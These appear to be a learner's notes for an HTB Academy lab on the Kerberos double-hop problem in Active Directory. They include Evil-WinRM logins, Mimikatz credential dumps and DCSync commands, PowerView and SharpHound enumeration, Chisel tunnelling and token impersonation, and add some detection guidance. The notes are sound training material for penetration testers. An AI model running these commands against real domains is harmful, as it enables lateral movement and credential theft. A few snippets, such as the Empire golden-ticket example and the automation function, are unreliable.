# 🎭 **Kerberos "Double Hop" Problem**

## 🎯 **HTB Academy: Active Directory Enumeration & Attacks**

### 📍 **Overview**

The **Kerberos "Double Hop" Problem** is a critical authentication limitation that occurs when attempting to use Kerberos authentication across two or more network hops. This problem frequently arises during lateral movement operations, particularly when using **WinRM/PowerShell remoting**, and can significantly impact penetration testing and red team operations. Understanding and overcoming this limitation is essential for successful Active Directory exploitation and lateral movement.

---

### 🔗 **Attack Chain Context**

**Complete Active Directory Compromise Timeline:**
```
Privileged Access → Double Hop Problem → Lateral Movement Solutions → Infrastructure Control
 (WinRM Access)     (Authentication)      (Credential Workarounds)     (Domain Domination)
```

**Prerequisites from Previous Modules:**
- **Privileged access achieved**: WinRM/PSRemote rights discovered via BloodHound
- **Valid domain credentials**: Obtained through various attack vectors
- **Remote access established**: Initial connection to target hosts
- **Multi-hop requirements**: Need to access additional resources from compromised hosts

---

## 🧠 **Technical Fundamentals**

### **Kerberos vs. NTLM Authentication**

#### **Kerberos Ticket-Based Authentication**
- **Tickets are NOT passwords**: Signed pieces of data from KDC stating resource access rights
- **Resource-specific**: Each ticket grants access to a specific resource/service
- **Non-transferable**: Tickets cannot be reused for different services without proper delegation
- **Time-limited**: Tickets have expiration times and renewal periods
- **Delegation-dependent**: Require specific delegation configurations for multi-hop scenarios

#### **NTLM Hash-Based Authentication**
- **Hash storage**: NTLM hash stored in session memory after authentication
- **Reusable**: Hash can be used for subsequent authentication attempts
- **Session-persistent**: Available for duration of user session
- **Multi-hop capable**: Can authenticate to multiple resources without additional configuration

### **The Core Problem Explained**

#### **What Happens During Kerberos Authentication**
1. **Initial Authentication**: User authenticates to KDC, receives TGT (Ticket Granting Ticket)
2. **Service Request**: User requests TGS (Ticket Granting Service) ticket for specific service
3. **Service Access**: TGS ticket sent to target service for authentication
4. **Session Establishment**: Service validates ticket and grants access

#### **Why the Double Hop Fails**
```
Attack Host → Target Host A → Target Host B
     ↓              ↓             ↓
  Password      TGS Ticket    NO CREDENTIALS
  Available     Available     (TGT not sent)
```

**Critical Issue**: When connecting via WinRM/PowerShell remoting:
- **TGS ticket sent**: Allows access to the immediate target (Host A)
- **TGT ticket NOT sent**: Cannot request new TGS tickets for additional resources (Host B)
- **No credential caching**: Password/hash not stored in remote session memory
- **Authentication failure**: Subsequent resource access denied

---

## 🔍 **Practical Demonstration**

### **Scenario Setup**
- **Attack Host**: Parrot/Kali Linux (domain-external)
- **Target Host A**: DEV01 (domain-joined, WinRM accessible)
- **Target Host B**: DC01 (Domain Controller, PowerView target)
- **Credentials**: `INLANEFREIGHT\backupadm` with Remote Management Users group membership

### **Problem Manifestation**

#### **1. WinRM Connection Establishment**
```powershell
# Connect via WinRM from Windows host
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm

# Or via Evil-WinRM from Linux
evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
```

#### **2. Credential Analysis with Mimikatz**
```powershell
# From within WinRM session on DEV01
cd 'C:\Users\Public\'
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

**Critical Observation**: Mimikatz output shows NO credentials for `backupadm` user:
```powershell
Authentication Id : 0 ; 1284107 (00000000:0013980b)
Session           : Interactive from 1
User Name         : srvadmin
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/28/2022 3:46:05 PM
SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :
```

**Process Verification**: WinRM processes running as `backupadm`:
```powershell
tasklist /V |findstr backupadm
# Output:
# wsmprovhost.exe    1844 Services    0    85,212 K Unknown    INLANEFREIGHT\backupadm    0:00:03 N/A
```

#### **3. Ticket Analysis**
```powershell
# Check cached Kerberos tickets
klist

# Output shows only local service ticket:
Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

#### **4. PowerView Failure Demonstration**
```powershell
# Import PowerView module
import-module .\PowerView.ps1

# Attempt domain enumeration (FAILS)
get-domainuser -spn

# Error Output:
Exception calling "FindAll" with "0" argument(s): "An operations error occurred."
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
```

---

## 🛠️ **Workaround Solutions**

### **🔧 Workaround #1: PSCredential Object Method**

#### **Applicable Scenarios**
- **Evil-WinRM sessions**: Works perfectly with Linux attack hosts
- **Non-interactive sessions**: No GUI access required
- **Command-by-command basis**: Credentials passed with each PowerView command
- **Flexibility**: Can be used with any PowerShell cmdlet supporting `-Credential` parameter

#### **Implementation Steps**

**1. Establish WinRM Session:**
```bash
# From Linux attack host
evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
```

**2. Create PSCredential Object:**
```powershell
# Convert password to SecureString
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

# Create PSCredential object
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```

**3. Execute Commands with Credentials:**
```powershell
# Import PowerView
import-module .\PowerView.ps1

# Successful domain enumeration with credential object
get-domainuser -spn -credential $Cred | select samaccountname

# Expected Output:
samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

**4. Verification of Failure Without Credentials:**
```powershell
# Attempt without credential object (FAILS)
get-domainuser -spn | select samaccountname

# Error Output:
Exception calling "FindAll" with "0" argument(s): "An operations error occurred."
```

#### **Advantages of PSCredential Method**
- ✅ **Works with Evil-WinRM**: Perfect for Linux-based attack hosts
- ✅ **No GUI required**: Fully command-line compatible
- ✅ **Flexible application**: Can be used with any credential-supporting cmdlet
- ✅ **Immediate solution**: No service restarts or configuration changes required

#### **Limitations of PSCredential Method**
- ❌ **Command-by-command**: Must specify credentials with each command
- ❌ **Tool compatibility**: Some tools may not support `-Credential` parameter
- ❌ **Verbose syntax**: Increases command complexity

### **🔧 Workaround #2: Register PSSession Configuration Method**

#### **Applicable Scenarios**
- **GUI access available**: RDP or physical console access to Windows host
- **Administrative privileges**: Ability to register PSSession configurations
- **Persistent sessions**: Long-term enumeration without repeated credential passing
- **Tool compatibility**: Works with tools that don't support `-Credential` parameter

#### **Prerequisites**
- **Windows attack host or compromised domain-joined machine**
- **GUI access via RDP**
- **Administrative privileges on the host**
- **PowerShell console (not Evil-WinRM)**

#### **Implementation Steps**

**1. Initial WinRM Connection:**
```powershell
# From Windows PowerShell console
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

**2. Verify Double Hop Problem:**
```powershell
# Check cached tickets (shows only HTTP service ticket)
klist

# Output:
Current LogonId is 0:0x11e387
Cached Tickets: (1)
#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
```

**3. Register New PSSession Configuration:**
```powershell
# Exit current session first
Exit-PSSession

# Register new session configuration with RunAs credentials
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

# WARNING: When RunAs is enabled in a Windows PowerShell session configuration, 
# the Windows security model cannot enforce a security boundary between different 
# user sessions that are created by using this endpoint.
```

**4. Restart WinRM Service:**
```powershell
# Restart WinRM service (will disconnect current sessions)
Restart-Service WinRM
```

**5. Connect Using Named Configuration:**
```powershell
# Establish new session with registered configuration
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
```

**6. Verify Ticket Availability:**
```powershell
# Check cached tickets (now shows TGT!)
klist

# Output:
Current LogonId is 0:0x2239ba
Cached Tickets: (1)
#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
    Start Time: 6/28/2022 13:24:37 (local)
    End Time:   6/28/2022 23:24:37 (local)
    Renew Time: 7/5/2022 13:24:37 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x1 -> PRIMARY
    Kdc Called: DC01
```

**7. Successful Domain Enumeration:**
```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Execute commands without credential object
get-domainuser -spn | select samaccountname

# Successful Output:
samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

#### **Advantages of PSSession Configuration Method**
- ✅ **Persistent solution**: No need to pass credentials with each command
- ✅ **Tool compatibility**: Works with all PowerShell tools and modules
- ✅ **Native authentication**: Proper Kerberos ticket caching
- ✅ **Performance**: Faster execution without repeated authentication

#### **Limitations of PSSession Configuration Method**
- ❌ **GUI requirement**: Cannot be used with Evil-WinRM
- ❌ **Administrative privileges**: Requires ability to register PSSession configurations
- ❌ **Service restart**: Requires WinRM service restart
- ❌ **Platform limitation**: Does not work from Linux PowerShell due to Kerberos limitations

---

## 🎯 **Attack Scenarios and Use Cases**

### **Common Double Hop Scenarios**

#### **Scenario 1: Linux Attack Host → Windows Target → Domain Controller**
```
Parrot Linux → DEV01 (WinRM) → DC01 (PowerView/BloodHound)
```
**Solution**: PSCredential Object method via Evil-WinRM

#### **Scenario 2: Windows Attack Host → Jump Host → Internal Servers**
```
Windows Attack Box → Jump Server (RDP/PSSession) → File Servers/SQL Servers
```
**Solution**: PSSession Configuration or PSCredential Object method

#### **Scenario 3: Compromised Workstation → Domain Controller → Trust Domains**
```
User Workstation → DC01 (DCSync) → Trusted Domain Controllers
```
**Solution**: Depends on delegation configuration and trust relationship

### **Real-World Impact Examples**

#### **PowerView Domain Enumeration**
```powershell
# These commands require Domain Controller communication:
Get-DomainUser -SPN                    # Kerberoastable accounts
Get-DomainComputer                     # Domain computers
Get-DomainGroupMember "Domain Admins"  # Privileged users
Find-LocalAdminAccess                  # Local admin rights
Get-DomainTrust                        # Trust relationships
```

#### **BloodHound Data Collection**
```powershell
# SharpHound requires extensive AD queries:
.\SharpHound.exe -c All                # Complete domain enumeration
.\SharpHound.exe -c Session,LoggedOn   # Session and logon data
```

#### **Credential Dumping Operations**
```powershell
# Mimikatz DCSync (requires DC communication):
.\mimikatz "lsadump::dcsync /user:krbtgt" exit
.\mimikatz "lsadump::dcsync /user:Administrator" exit
```

---

## 🔍 **Technical Deep Dive**

### **Unconstrained Delegation Exception**

#### **When Double Hop Problem Doesn't Occur**
If **unconstrained delegation** is enabled on a server:
- **TGT ticket forwarded**: User's TGT sent along with TGS request
- **Credential caching**: Target server caches user's TGT
- **Impersonation capability**: Server can request TGS tickets on user's behalf
- **Attack opportunity**: Unconstrained delegation servers are high-value targets

#### **Identifying Unconstrained Delegation**
```powershell
# PowerView query for unconstrained delegation
Get-DomainComputer -Unconstrained | select name

# LDAP query for unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

### **Constrained Delegation Scenarios**

#### **Service-Specific Delegation**
- **Limited scope**: Delegation only to specific services
- **Protocol transition**: May allow protocol changes (Kerberos to NTLM)
- **S4U2Self/S4U2Proxy**: Service for User extensions enable constrained delegation

#### **Resource-Based Constrained Delegation (RBCD)**
- **Target-controlled**: Delegation configured on target resource
- **Modern approach**: Newer delegation method in Windows 2012+
- **Attack vector**: Can be abused if target object permissions allow modification

---

## 🔐 **Alternative Solutions and Advanced Techniques**

### **CredSSP (Credential Security Support Provider)**

#### **Implementation**
```powershell
# Enable CredSSP on client
Enable-WSManCredSSP -Role Client -DelegateComputer "target-server"

# Enable CredSSP on server
Enable-WSManCredSSP -Role Server

# Connect using CredSSP
Enter-PSSession -ComputerName "target" -Credential $cred -Authentication CredSSP
```

#### **Security Considerations**
- **Credential exposure**: Sends credentials to remote server
- **Security risk**: Credentials cached on target system
- **Use with caution**: Only in trusted environments

### **Port Forwarding Solutions**

#### **SSH Tunneling**
```bash
# Forward RDP through SSH tunnel
ssh -L 3389:target-dc:3389 user@jump-host

# Forward LDAP through SSH tunnel
ssh -L 389:target-dc:389 user@jump-host
```

#### **Chisel/SocksOverRDP**
```bash
# SOCKS proxy for application-layer forwarding
./chisel server -p 8080 --reverse
./chisel client target-ip:8080 R:1080:socks
```

### **Process Injection Techniques**

#### **Token Impersonation**
```powershell
# Inject into process running as target user
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "target-user"
```

#### **Sacrificial Process Method**
- **Create process**: Start new process as target user
- **Inject payload**: Insert shellcode or .NET assembly
- **Inherit context**: Process runs with target user's full credentials

---

## 🛡️ **Detection and Defensive Measures**

### **Monitoring Double Hop Workarounds**

#### **PSSession Configuration Detection**
```powershell
# Monitor PSSession configuration changes
Get-PSSessionConfiguration

# Event ID monitoring:
# 4103 - PowerShell Script Block Logging
# 4104 - PowerShell Script Block Logging (detailed)
# 400-403 - Windows Remote Management events
```

#### **CredSSP Usage Detection**
```powershell
# Monitor CredSSP configuration changes
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation"

# Event ID monitoring:
# 4624 - Account logon (Network, Type 3)
# 4648 - Logon with explicit credentials
```

### **PowerShell Logging Enhancement**

#### **Script Block Logging**
```powershell
# Enable detailed PowerShell logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockInvocationLogging" -Value 1
```

#### **Module Logging**
```powershell
# Enable PowerShell module logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" -Name "*" -Value "*"
```

### **Network Monitoring**

#### **Kerberos Traffic Analysis**
- **AS-REQ/AS-REP**: Initial authentication requests
- **TGS-REQ/TGS-REP**: Service ticket requests
- **Unusual patterns**: Multiple service ticket requests from single host
- **Cross-subnet authentication**: Unexpected Kerberos traffic patterns

#### **WinRM Traffic Monitoring**
- **Port 5985/5986**: Monitor WinRM HTTP/HTTPS traffic
- **SOAP XML analysis**: Examine WinRM command content
- **Session duration**: Identify long-running remote sessions

---

## 🚀 **Advanced Attack Chains**

### **Double Hop in Complex Scenarios**

#### **Multi-Domain Trust Exploitation**
```
Attack Host → Domain A Server → Domain B Controller → Domain C Resources
```

**Challenges**:
- **Cross-domain authentication**: Different Kerberos realms
- **Trust relationship dependencies**: Transitive vs. non-transitive trusts
- **Delegation configurations**: Per-domain delegation settings

#### **Cloud Hybrid Environments**
```
On-Premises → Azure AD Connect → Azure AD → Cloud Resources
```

**Considerations**:
- **Authentication protocols**: Kerberos vs. SAML vs. OAuth
- **Credential synchronization**: Password hash sync vs. pass-through authentication
- **Hybrid identity**: On-premises accounts with cloud access

### **Automation and Scripting**

#### **Automated Workaround Implementation**
```powershell
# Function to handle double hop automatically
function Invoke-DoubleHopWorkaround {
    param(
        [string]$ComputerName,
        [PSCredential]$Credential,
        [string]$Command
    )
    
    # Create PSCredential object
    $SecPassword = ConvertTo-SecureString $Credential.GetNetworkCredential().Password -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential($Credential.UserName, $SecPassword)
    
    # Execute command with credential passing
    Invoke-Command -ComputerName $ComputerName -Credential $Credential -ScriptBlock {
        param($Cred, $Cmd)
        Invoke-Expression "$Cmd -Credential `$Cred"
    } -ArgumentList $Cred, $Command
}
```

#### **PowerShell Empire Integration**
```powershell
# Empire module for double hop handling
usemodule credentials/mimikatz/golden_ticket
set Credential domain\user:password
set Target target-server
execute
```

---

## 📊 **Key Takeaways**

### **Technical Understanding**
1. **Kerberos vs. NTLM**: Fundamental difference in credential handling
2. **Ticket mechanics**: TGT vs. TGS ticket usage and limitations
3. **Authentication delegation**: Constrained, unconstrained, and resource-based delegation
4. **Network protocols**: WinRM, RDP, and their authentication mechanisms

### **Practical Solutions**
1. **PSCredential Object**: Universal solution for Evil-WinRM and command-line scenarios
2. **PSSession Configuration**: Persistent solution for GUI-accessible Windows hosts
3. **Alternative methods**: CredSSP, port forwarding, and process injection techniques
4. **Tool compatibility**: Understanding which tools support which workarounds

### **Operational Considerations**
1. **Attack platform**: Linux vs. Windows attack host capabilities
2. **Target environment**: Domain topology and delegation configurations
3. **Detection risk**: Monitoring and logging considerations
4. **Persistence vs. stealth**: Balancing effectiveness with operational security

### **Professional Application**
- **Red team operations**: Realistic attack simulation with proper lateral movement
- **Penetration testing**: Comprehensive domain exploitation methodology
- **Security assessment**: Understanding authentication boundaries and limitations
- **Incident response**: Recognizing double hop exploitation techniques

**🔑 Complete mastery of Kerberos "Double Hop" Problem - from technical understanding through practical workarounds to advanced attack chains - representing essential Active Directory lateral movement expertise for enterprise penetration testing!**

--- 